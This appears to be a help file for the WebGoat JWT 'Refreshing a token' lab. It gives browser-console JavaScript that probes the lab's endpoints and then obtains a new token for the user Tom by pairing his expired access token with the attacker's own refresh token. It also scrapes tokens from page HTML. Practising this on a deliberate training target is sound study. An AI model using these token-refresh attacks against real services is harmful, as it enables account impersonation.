@@ -1,0 +1,217 @@
+╔═══════════════════════════════════════════════════════════╗
+║   JWT REFRESH TOKEN - ALTERNATIVE METHODS                ║
+║   For when /JWT/refresh/login returns 401                ║
+╚═══════════════════════════════════════════════════════════╝
+
+⚠️ THE 401 ERROR MEANS:
+The /JWT/refresh/login endpoint requires the lesson to be
+active/initialized first. You need to interact with the page.
+
+═══════════════════════════════════════════════════════════
+
+🎯 METHOD 1: Click the Page Button First
+═══════════════════════════════════════════════════════════
+
+1. On the "Refreshing a token" lesson page, look for:
+   - "Checkout" button
+   - "Add to cart" button
+   - "Login" button
+   - "Get token" button
+
+2. CLICK that button first to initialize the lesson
+
+3. THEN open Console (F12) and run the diagnostic:
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// Paste this to see what endpoints are available:
+(async function(){const endpoints=['/WebGoat/JWT/refresh/login','/WebGoat/JWT/refresh/checkout','/WebGoat/JWT/refresh/newToken'];for(const e of endpoints){try{const r=await fetch(e,{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'});console.log(`${e}: ${r.status}`,await r.text().then(t=>t.substring(0,100)))}catch(err){console.log(`${e}: ERROR`,err.message)}}})();
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+4. Once you see 200 responses, run the full attack
+
+═══════════════════════════════════════════════════════════
+
+🎯 METHOD 2: Extract Token from Network Tab
+═══════════════════════════════════════════════════════════
+
+1. Open DevTools (F12) → Network tab
+2. Click "Checkout" or "Login" button on the page
+3. Look for requests to /JWT/refresh/*
+4. Check the Response for access_token and refresh_token
+5. Copy YOUR refresh_token
+6. Then run this in Console:
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// Replace YOUR_REFRESH_TOKEN with the actual token
+(async function(){
+    const TOMS_EXPIRED = 'eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q';
+    const MY_REFRESH = 'YOUR_REFRESH_TOKEN'; // <-- Paste here
+    
+    const a=await(await fetch('/WebGoat/JWT/refresh/newToken',{method:'POST',headers:{'Authorization':'Bearer '+TOMS_EXPIRED,'Content-Type':'application/json'},body:JSON.stringify({refresh_token:MY_REFRESH})})).json();
+    console.log('Tom new token:',a.access_token);
+    
+    const c=await(await fetch('/WebGoat/JWT/refresh/checkout',{method:'POST',headers:{'Authorization':'Bearer '+a.access_token,'Content-Type':'application/json'}})).json();
+    console.log('🎉 SUCCESS!',c);
+})();
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+═══════════════════════════════════════════════════════════
+
+🎯 METHOD 3: Check if Token is in Page HTML/JavaScript
+═══════════════════════════════════════════════════════════
+
+Sometimes WebGoat puts the token directly in the page.
+
+Run this in Console:
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// Search for tokens in page
+const html = document.documentElement.innerHTML;
+const tokens = html.match(/eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/g);
+if(tokens) {
+    console.log(`Found ${tokens.length} token(s):`);
+    tokens.forEach((t,i) => console.log(`Token ${i+1}:`, t));
+} else {
+    console.log('No tokens found in page HTML');
+}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+═══════════════════════════════════════════════════════════
+
+🎯 METHOD 4: Use the Lesson UI Directly
+═══════════════════════════════════════════════════════════
+
+The lesson might have a different flow:
+
+1. Click "Checkout" button (this will fail with 401)
+2. In Network tab, find the request that failed
+3. Right-click → Copy → Copy as Fetch
+4. Paste in Console
+5. Modify the Authorization header to use Tom's expired token:
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+fetch('/WebGoat/JWT/refresh/checkout', {
+    method: 'POST',
+    headers: {
+        'Authorization': 'Bearer eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q',
+        'Content-Type': 'application/json'
+    }
+}).then(r => r.json()).then(d => console.log('Result:', d));
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+This might work if the lesson doesn't actually validate
+the token properly!
+
+═══════════════════════════════════════════════════════════
+
+🎯 METHOD 5: Manual Step-by-Step with UI
+═══════════════════════════════════════════════════════════
+
+STEP 1: Get YOUR tokens from the lesson UI
+
+// Watch Network tab, click buttons, then run:
+console.log('Your tokens from Network requests');
+
+STEP 2: Find the actual endpoint being called
+
+// In Network tab, look for:
+// - POST requests to /JWT/
+// - Check what parameters they use
+// - Note the exact URL
+
+STEP 3: Copy the working request format
+
+// Right-click request → Copy → Copy as Fetch
+// Paste in text editor to see format
+
+STEP 4: Modify for the attack
+
+// Change Authorization header to Tom's token
+// Keep body with YOUR refresh_token
+
+═══════════════════════════════════════════════════════════
+
+🔍 DIAGNOSTIC SCRIPT
+═══════════════════════════════════════════════════════════
+
+Run this to diagnose what's available:
+
+// See file: jwt_refresh_diagnostic.js
+// Or paste this one-liner:
+
+(async function(){console.clear();console.log('Testing endpoints...');const e=['/WebGoat/JWT/refresh/login','/WebGoat/JWT/refresh/checkout','/WebGoat/JWT/refresh/newToken'];for(const url of e){try{const r=await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user:'Tom',password:'x'})});console.log(`%c${url}`,'font-weight:bold');console.log(`  Status: ${r.status} ${r.statusText}`);const t=await r.text();console.log(`  Response: ${t.substring(0,100)}...`)}catch(err){console.log(`%c${url}`,'color:red');console.log(`  Error: ${err.message}`)}}})();
+
+═══════════════════════════════════════════════════════════
+
+⚠️ COMMON ISSUE: Lesson Not Started
+═══════════════════════════════════════════════════════════
+
+The 401 error typically means:
+
+1. The lesson hasn't been initialized yet
+   → Click buttons on the page first
+
+2. You're not on the right lesson page
+   → Make sure you're on "Refreshing a token" lesson
+
+3. The endpoint requires authentication
+   → You need to be logged into WebGoat
+
+4. The lesson works differently than expected
+   → Check the lesson instructions
+
+═══════════════════════════════════════════════════════════
+
+💡 QUICK FIX: Try This First
+═══════════════════════════════════════════════════════════
+
+1. Navigate to the "Refreshing a token" lesson
+2. Look at the page - there should be:
+   - A shopping cart
+   - Books to purchase
+   - A "Checkout" button
+   - Total: $31.53
+
+3. Click the "Checkout" button (will fail)
+
+4. Open Network tab (F12), find the failed request
+
+5. Copy the request (right-click → Copy as Fetch)
+
+6. Paste in Console and modify Authorization header
+
+7. Replace token with Tom's expired token
+
+8. Run it!
+
+═══════════════════════════════════════════════════════════
+
+📋 WHAT WE KNOW WORKS:
+
+From the lesson instructions:
+- Endpoint exists: /WebGoat/JWT/refresh/newToken
+- Endpoint exists: /WebGoat/JWT/refresh/checkout
+- Token: Tom's expired token from log
+- Method: Use YOUR refresh_token with Tom's access_token
+
+The 401 on /login means that's not the right way to get
+your refresh token. You need to get it from the lesson UI.
+
+═══════════════════════════════════════════════════════════
+
+🎯 MOST LIKELY SOLUTION:
+
+1. Go to lesson page
+2. Click any button to trigger token generation
+3. Check Network tab for the response
+4. Extract YOUR refresh_token from response
+5. Use METHOD 2 above with your actual refresh_token
+
+═══════════════════════════════════════════════════════════
+
+Need more help? 
+- Check jwt_refresh_diagnostic.js for full diagnostic
+- Or paste the diagnostic one-liner above
+- Or describe what you see on the lesson page
+
+═══════════════════════════════════════════════════════════
